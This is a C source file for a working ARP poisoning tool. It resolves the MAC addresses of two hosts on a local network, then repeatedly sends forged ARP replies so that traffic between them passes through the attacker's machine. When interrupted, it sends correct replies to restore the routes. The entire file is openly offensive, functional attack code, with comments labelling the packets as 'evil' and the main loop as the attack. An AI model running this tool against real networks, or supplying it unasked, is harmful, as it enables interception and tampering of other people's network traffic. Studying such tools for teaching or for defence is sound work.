#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "general/default.h"
#include "general/service_func.h"
#include "socket/interface.h"
#include "socket/sock.h"
#include "net_headers/ethernet/eth.h"
#include "net_headers/arp/arp.h"
#include <time.h>
#include <signal.h>
#include <pthread.h>

// argument for second thread
struct thread_arg
{
	int sock;
	unsigned int target_ip;
	unsigned char found_mac[ETH_HLEN];
	unsigned char found_flag;
};

#define TIMER_ON 1
#define TIMER_OFF 2
#define TIMEOUT 4

pthread_t RECEIVER_THREAD;	// id of thread that gets replies
int ATTACK_STOP = 1;		// flag for stopping of attack

void receive_reply(struct thread_arg *arg);
int set_signal_capture(int signum, void *function);
void timer_handler();
void sigint_handler();
timer_t set_timer(int action, int sec, timer_t exist_timer_id);

int main(int argc, char **argv)
{ 
	if(argc < 4)
	{
		printf("Using: ./arp_poison [INTERFACE] [IP_1] [IP_2]\n");

		exit(-1);
	}

	int sock;				  // socket
	struct interface *iface;  // data of our interface
	struct ethhdr *eth;		  // ethernet header
	struct arp_header *arp;   // arp header
	unsigned char packet_1[ETH_HLEN + ARP_HEADER_SIZE];
	unsigned char packet_2[ETH_HLEN + ARP_HEADER_SIZE];
	unsigned int net_addr_1, net_addr_2; // binary IP addresses
	unsigned char hdr_addr_1[ETH_ALEN], hdr_addr_2[ETH_ALEN]; // binary mac addresses
	struct thread_arg arg;    // arguments for new thread
	char errbuf[ERRBUF_SIZE]; // buffer for errors

	memset(&arg, 0, sizeof(arg));

	// Convert entered addresses to binary format
	net_addr_1 = inet_addr(argv[2]);
	net_addr_2 = inet_addr(argv[3]);

	// get interface parameters
	if((iface = get_interface_params(argv[1], errbuf)) == NULL)
	{
		printf("[!] get_interface_params(): %s\n", errbuf);

		exit(-1);
	}

	// create a packet socket
	if((sock = create_packet_socket(iface, errbuf)) == -1)
	{
		printf("[!] create_packet_socket(): %s\n", errbuf);

		exit(-1);
	}

	printf("[*] Selected interface \'%s\'\n[*] Targets: %s, %s\n", iface->name, argv[2], argv[3]);

	// resolving addresses
	// create first ARP packet
	eth = create_eth_header(iface->eth_addr, binary_mac_format("ff:ff:ff:ff:ff:ff"), ETH_P_ARP);
	arp = create_arp_header(iface->eth_addr, iface->net_addr, binary_mac_format("00:00:00:00:00:00"), (u_char *)&net_addr_1, ARPOP_REQUEST);

	memcpy(packet_1, eth, ETH_HLEN);
	memcpy(packet_1 + ETH_HLEN, arp, ARP_HEADER_SIZE);

	// create new thread for receving of replies
	arg.sock = sock;
	arg.target_ip = net_addr_1;
	pthread_create(&RECEIVER_THREAD, NULL, (void *)&receive_reply, &arg);

	/* Response ARP packet time-out: 3 seconds. Now
	   we should catch signal SIGRTMIN that may come 
	   after the timer runs */

	// set SIGRTMIN capture
	if(set_signal_capture(SIGRTMIN, timer_handler) == -1)
	{
		printf("[!] set_signal_capture(): %s\n", strerror(errno));

		exit(-1);
	}


	if(send(sock, packet_1, ETH_HLEN + ARP_HEADER_SIZE, 0) <= 0)
	{
		printf("[!] send(): %s\n", strerror(errno));

		exit(-1);
	}

	// waiting for exiting child thread
	pthread_join(RECEIVER_THREAD, NULL);

	// if MAC address is found
	if(arg.found_flag == 1)
	{
		memcpy(hdr_addr_1, arg.found_mac, ETH_ALEN);

		printf("[*] %s has %02x", argv[2], arg.found_mac[0]);

		for(int i = 1; i < ETH_ALEN; i++)
			printf(":%02x", arg.found_mac[i]);

		putchar('\n');
	}

	// ..or not
	else
	{
		printf("[!] Can't resolve %s, time-out\n", inet_ntoa(*(struct in_addr *)&net_addr_1));

		exit(0);
	}

	// create second ARP packet
	arp = create_arp_header(iface->eth_addr, iface->net_addr, binary_mac_format("00:00:00:00:00:00"), (u_char *)&net_addr_2, ARPOP_REQUEST);

	memcpy(packet_1 + ETH_HLEN, arp, ARP_HEADER_SIZE);

	// create new thread for receving of replies
	arg.found_flag = 0;
	arg.target_ip = net_addr_2;
	pthread_create(&RECEIVER_THREAD, NULL, (void *)&receive_reply, &arg);

	if(send(sock, packet_1, ETH_HLEN + ARP_HEADER_SIZE, 0) <= 0)
	{
		printf("[!] send(): %s\n", strerror(errno));

		exit(-1);
	}

	// wait for quitting of thread
	pthread_join(RECEIVER_THREAD, NULL);

	if(arg.found_flag == 1)
	{
		memcpy(hdr_addr_2, arg.found_mac, ETH_ALEN);

		printf("[*] %s has %02x", argv[3], arg.found_mac[0]);

		for(int i = 1; i < ETH_ALEN; i++)
			printf(":%02x", arg.found_mac[i]);

		putchar('\n');
	}

	else
	{
		printf("[!] Can't resolve %s, time-out\n", inet_ntoa(*(struct in_addr *)&net_addr_2));

		exit(0);
	}

	// now we should build evil ARP packets
	eth = create_eth_header(iface->eth_addr, hdr_addr_1, ETH_P_ARP);
	arp = create_arp_header(iface->eth_addr, (u_char *)&net_addr_2, hdr_addr_1, (u_char *)&net_addr_1, ARPOP_REPLY);

	memcpy(packet_1, eth, sizeof(struct ethhdr));
	memcpy(packet_1 + ETH_HLEN, arp, sizeof(struct arp_header));

	eth = create_eth_header(iface->eth_addr, hdr_addr_2, ETH_P_ARP);
	arp = create_arp_header(iface->eth_addr, (u_char *)&net_addr_1, hdr_addr_2, (u_char *)&net_addr_2, ARPOP_REPLY);

	memcpy(packet_2, eth, sizeof(struct ethhdr));
	memcpy(packet_2 + ETH_HLEN, arp, sizeof(struct arp_header));

	printf("[*] Attack...\n");

	// set SIGINT capture
	set_signal_capture(SIGINT, sigint_handler);

	// ATTACK!
	for(; ATTACK_STOP; )
	{
		send(sock, packet_1, ETH_HLEN + ARP_HEADER_SIZE, 0);
		send(sock, packet_2, ETH_HLEN + ARP_HEADER_SIZE, 0);

		// debug print
		printf("[*] %02x", iface->eth_addr[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", iface->eth_addr[i]);

		printf(" %s -> ", inet_ntoa(*(struct in_addr *)&net_addr_2));

		printf("%02x", hdr_addr_1[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", hdr_addr_1[i]);

		printf(" %s\n", inet_ntoa(*(struct in_addr *)&net_addr_1));

		printf("[*] %02x", iface->eth_addr[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", iface->eth_addr[i]);

		printf(" %s -> ", inet_ntoa(*(struct in_addr *)&net_addr_1));

		printf("%02x", hdr_addr_2[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", hdr_addr_2[i]);

		printf(" %s\n", inet_ntoa(*(struct in_addr *)&net_addr_2));

		sleep(1);
	}

	printf("[*] Route restoration...\n");

	// Route restoration
	eth = create_eth_header(hdr_addr_1, hdr_addr_2, ETH_P_ARP);
	arp = create_arp_header(hdr_addr_1, (u_char *)&net_addr_1, hdr_addr_2, (u_char *)&net_addr_2, ARPOP_REPLY);

	memcpy(packet_1, eth, sizeof(struct ethhdr));
	memcpy(packet_1 + ETH_HLEN, arp, sizeof(struct arp_header));

	eth = create_eth_header(hdr_addr_2, hdr_addr_1, ETH_P_ARP);
	arp = create_arp_header(hdr_addr_2, (u_char *)&net_addr_2, hdr_addr_1, (u_char *)&net_addr_1, ARPOP_REPLY);

	memcpy(packet_2, eth, sizeof(struct ethhdr));
	memcpy(packet_2 + ETH_HLEN, arp, sizeof(struct arp_header));

	for(int i = 0; i < 3; i++)
	{
		send(sock, packet_1, ETH_HLEN + ARP_HEADER_SIZE, 0);
		send(sock, packet_2, ETH_HLEN + ARP_HEADER_SIZE, 0);

		// debug print
		printf("[*] %02x", hdr_addr_1[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", hdr_addr_1[i]);

		printf(" %s -> ", inet_ntoa(*(struct in_addr *)&net_addr_1));

		printf("%02x", hdr_addr_2[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", hdr_addr_2[i]);

		printf(" %s\n", inet_ntoa(*(struct in_addr *)&net_addr_2));

		printf("[*] %02x", hdr_addr_2[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", hdr_addr_2[i]);

		printf(" %s -> ", inet_ntoa(*(struct in_addr *)&net_addr_2));

		printf("%02x", hdr_addr_1[0]);
		for(int i = 1; i < 6; i++)
			printf(":%02x", hdr_addr_1[i]);

		printf(" %s\n", inet_ntoa(*(struct in_addr *)&net_addr_1));

		sleep(2);
	}

	close(sock);

	printf("[*] Attack interrupted, exit...\n");

	exit(0);
}

void receive_reply(struct thread_arg *arg)
{
	unsigned char packet[512];
	struct arp_header *arp = (struct arp_header *)(packet + ETH_HLEN);
	int res;
	timer_t exist_timer;

	// set timer
	exist_timer = set_timer(TIMER_ON, TIMEOUT, 0);

	if(exist_timer == NULL)
		pthread_exit(NULL);
	
	while(arg->found_flag == 0)
	{
		res = recv(arg->sock, packet, 512, 0);

		if(res <= 0)
			pthread_exit(NULL);

		// if it's ARP-reply packet and it has target source ip address, return found mac
		if(arp->arp_op == ntohs(ARPOP_REPLY) && (arg->target_ip == *(u_int *)arp->arp_pro_src))
		{
			arg->found_flag = 1;
			memcpy(arg->found_mac, arp->arp_hrd_src, ETH_ALEN);

			// of the timer
			set_timer(TIMER_OFF, 0, exist_timer);

			pthread_exit(NULL);
		}
	}
}

int set_signal_capture(int signum, void *function)
{
	struct sigaction sa;

	sa.sa_flags = SA_RESTART;
	sigemptyset(&sa.sa_mask);
	sa.sa_sigaction = function;

	if(sigaction(signum, &sa, NULL) == -1)
		return -1;

	return 0;
}

void timer_handler()
{
	printf("[*] Got SIGRTMIN\n");

	pthread_cancel(RECEIVER_THREAD);
}

void sigint_handler()
{
	printf("[*] Got SIGINT\n");

	ATTACK_STOP--;
}

/* If 'action' is TIMER_ON, 'exist_timer_id' is 0
   If 'action' is TIMER_OFF, 'sec' is 0, 'exist_timer_id' is timer id */
timer_t set_timer(int action, int sec, timer_t exist_timer_id)
{
	struct itimerspec ival;
	struct sigevent sigev;
	timer_t new_timer_id = 0;

	sigev.sigev_notify = SIGEV_SIGNAL;
	sigev.sigev_signo = SIGRTMIN;
	sigev.sigev_value.sival_int = 1;

	memset(&ival, 0, sizeof(ival));

	/* Timer ON */
	if(action == TIMER_ON)
	{
		if(timer_create(CLOCK_MONOTONIC, &sigev, &new_timer_id) == -1)
			return NULL;

		ival.it_value.tv_sec = sec;

		if(timer_settime(new_timer_id, 0, &ival, NULL) == -1)
			return NULL;

		return new_timer_id;
		
	}

	/* Timer off */
	else
	{
		ival.it_value.tv_sec = 0;

		if(timer_settime(exist_timer_id, 0, &ival, NULL) == -1)
			return NULL;
	}

	return 0;

}